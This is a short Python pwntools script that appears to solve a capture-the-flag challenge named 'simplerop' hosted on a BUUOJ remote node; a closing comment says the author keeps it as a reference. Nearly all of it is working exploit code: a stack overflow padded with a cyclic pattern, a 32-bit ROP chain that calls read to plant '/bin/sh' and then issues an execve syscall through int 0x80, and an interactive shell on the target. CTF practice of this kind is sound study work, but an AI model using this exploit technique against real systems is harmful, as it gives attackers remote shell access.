from pwn import *

context.log_level = "debug"

exe = ELF("./simplerop")
r = remote("node4.buuoj.cn", 29918)
# r = exe.process()
# gdb.attach(r)

# 0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret
# 0x080493e1 : int 0x80
# 0x080bae06 : pop eax ; ret
pop3 = p32(0x806E850)
int80 = p32(0x80493E1)
pop_eax = p32(0x080BAE06)

p = cyclic(32)
p += p32(exe.sym["read"]) + pop3 + p32(0) + p32(0x080eb584) + p32(8)
p += pop_eax + p32(0xB)
p += pop3 + p32(0) + p32(0) + p32(0x080eb584)
p += int80
r.recvuntil(b":")

r.send(p)
r.send(b"/bin/sh\x00")

r.interactive()
# this chall is unique for its successive ROP chain makeups, so I save it as a reference